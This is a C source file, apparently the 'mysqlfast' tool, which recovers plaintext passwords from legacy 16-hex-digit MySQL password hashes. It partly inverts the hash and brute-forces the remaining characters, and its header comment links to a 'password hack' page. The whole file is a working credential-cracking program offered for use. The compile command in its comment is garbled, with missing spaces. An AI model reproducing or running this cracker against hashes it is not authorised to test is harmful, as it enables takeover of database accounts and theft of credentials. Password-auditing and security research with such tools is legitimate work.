/* This program is public domain. Share and enjoy.
* $ gcc-o2-fomit-frame-pointer Mysqlfast.c-o mysqlfast
* $ mysqlfast 6294b50f67eda209
* hash:6294b50f67eda209
* https://topic.alibabacloud.com/a/mysql-database-password-hack_1_41_30023705.html
*/

#include <stdio.h>

typedef unsigned long u32;

/* allowable characters in password; 33-126 is printable ASCII */

#define MIN_CHAR 33

#define MAX_CHAR 126

/* Maximum Length of password */

#define MAX_LEN 12

#define MASK 0X7FFFFFFFL

int crack0(int stop, u32 targ1, u32 targ2, int *pass_ary)
{
    int i, c;
    u32 d, e, sum, step, diff, div, xor1, xor2, state1, state2;
    u32 newstate1, newstate2, newstate3;
    u32 state1_ary[MAX_LEN - 2], state2_ary[MAX_LEN - 2];
    u32 xor_ary[MAX_LEN - 3], step_ary[MAX_LEN - 3];

    i = -1;
    sum = 7;
    state1_ary[0] = 1345345333L;
    state2_ary[0] = 0x12345671l;
    while (1)
    {
        while (i < stop)
        {
            i++;
            pass_ary[i] = MIN_CHAR;
            step_ary[i] = (state1_ary[i] & 0x3f) + sum;
            xor_ary[i] = step_ary[i] * MIN_CHAR + (state1_ary[i] << 8);
            sum += MIN_CHAR;
            state1_ary[i + 1] = state1_ary[i] ^ xor_ary[i];
            state2_ary[i + 1] = state2_ary[i]
                                + ((state2_ary[i] << 8) ^ state1_ary[i + 1]);
        }
        state1 = state1_ary[i + 1];
        state2 = state2_ary[i + 1];
        step = (state1 & 0x3f) + sum;
        xor1 = step * MIN_CHAR + (state1 << 8);
        xor2 = (state2 << 8) ^ state1;
        for (c = MIN_CHAR; c <= MAX_CHAR; c++, xor1 += step)
        {
            newstate2 = state2 + (xor1 ^ xor2);
            newstate1 = state1 ^ xor1;
            newstate3 = (targ2 - newstate2) ^ (newstate2 << 8);
            div = (newstate1 & 0x3f) + sum + c;
            diff = ((newstate3 ^ newstate1) - (newstate1 << 8)) & MASK;
            if (diff % div != 0)
                continue;
            d = diff / div;
            if (d < MIN_CHAR || d > MAX_CHAR)
                continue;
            div = (newstate3 & 0x3f) + sum + c + d;
            diff = ((targ1 ^ newstate3) - (newstate3 << 8)) & MASK;
            if (diff % div != 0)
                continue;
            e = diff / div;
            if (e < MIN_CHAR || e > MAX_CHAR)
                continue;
            pass_ary[i + 1] = c;
            pass_ary[i + 2] = d;
            pass_ary[i + 3] = e;
            return 1;
        }

        while (i >= 0 && pass_ary[i] >= MAX_CHAR)
        {
            sum -= MAX_CHAR;
            i--;
        }

        if (i < 0)
            break;

        pass_ary[i]++;
        xor_ary[i] += step_ary[i];
        sum++;
        state1_ary[i + 1] = state1_ary[i] ^ xor_ary[i];
        state2_ary[i + 1] = state2_ary[i]
                            + ((state2_ary[i] << 8) ^ state1_ary[i + 1]);
    }

    return 0;
}

void crack(char *hash)
{
    int i, len;
    u32 targ1, targ2, targ3;
    int pass[MAX_LEN];

    if (sscanf(hash, "%8lx%lx", &targ1, &targ2) != 2)
    {
        printf("invalid password hash:%s\n", hash);
        return;
    }

    printf(" Hash:%08lx%08lx\n", targ1, targ2);
    targ3 = targ2 - targ1;
    targ3 = targ2 - ((targ3 << 8) ^ targ1);
    targ3 = targ2 - ((targ3 << 8) ^ targ1);
    targ3 = targ2 - ((targ3 << 8) ^ targ1);
    for (len = 3; len <= MAX_LEN; len++)
    {
        printf("Trying length %d\n", len);
        if (crack0(len - 4, targ1, targ3, pass))
        {
            printf("Found pass: ");
            for (i = 0; i < len; i++)
                putchar(pass[i]);
            putchar('\n');
            break;
        }
    }

    if (len > MAX_LEN)
        printf(" pass not found\n");
}

int main(int argc, char *argv[])
{
    int i;
    if (argc <= 1)
        printf("usage:%s hash\n", argv[0]);
    for (i = 1; i < argc; i++)
        crack(argv[i]);
    return 0;
}